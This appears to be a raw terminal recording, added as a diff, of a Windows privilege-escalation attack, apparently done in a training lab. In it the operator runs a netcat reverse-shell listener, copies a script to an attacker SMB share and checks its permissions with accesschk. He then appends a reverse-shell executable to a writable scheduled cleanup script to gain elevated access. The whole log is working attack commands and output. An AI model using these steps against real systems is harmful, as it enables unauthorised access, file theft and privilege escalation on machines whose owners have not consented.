@@ -1,0 +1,52 @@
+Script started on 2025-03-16 15:51:05+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 13264
+[KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>cd C:\DevTools[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd C:\DevTools
+[Kcd C:\DevTools
+[K
+C:\DevTools>[KC:\DevTools>[K[?2004hC:\DevTools>dir[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdir
+[Kdir
+[K Volume in drive C has no label.
+ Volume Serial Number is 54A8-AA62
+
+ Directory of C:\DevTools
+
+06/05/2020  08:32 AM    <DIR>          .
+06/05/2020  08:32 AM    <DIR>          ..
+06/05/2020  08:32 AM               173 CleanUp.ps1
+               1 File(s)            173 bytes
+               2 Dir(s)  30,836,965,376 bytes free
+
+C:\DevTools>[KC:\DevTools>[K[?2004hC:\DevTools>copy C      [Kle    [KanUp.ps1 [7m\\10.8.61.245\kali\[27m[C[C[C[C[C[C[C[C[C[C[C[C[7mcopy CleanUp.ps1 [27m\\10.8.61.245\kali\[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcopy CleanUp.ps1 \\10.8.61.245\kali\
+[Kcopy CleanUp.ps1 \\10.8.61.245\kali\
+[K        1 file(s) copied.
+[K
+C:\DevTools>[KC:\DevTools>[KPrivEs[?2004hC:\DevTools>[7mC:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1[27m[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hC:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+[KC:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+[KRW C:\DevTools\CleanUp.ps1
+	FILE_ADD_FILE
+	FILE_ADD_SUBDIRECTORY
+	FILE_APPEND_DATA
+	FILE_EXECUTE
+	FILE_LIST_DIRECTORY
+	FILE_READ_ATTRIBUTES
+	FILE_READ_DATA
+	FILE_READ_EA
+	FILE_TRAVERSE
+	FILE_WRITE_ATTRIBUTES
+	FILE_WRITE_DATA
+	FILE_WRITE_EA
+	DELETE
+	SYNCHRONIZE
+	READ_CONTROL
+[K
+C:\DevTools>[KC:\DevTools>[K[?2004hC:\DevTools>[7mecho C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1[27m[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+[Kecho C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+[K
+C:\DevTools>[KC:\DevTools>[K[?2004hC:\DevTools>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-03-16 15:58:41+03:00 [COMMAND_EXIT_CODE="0"]
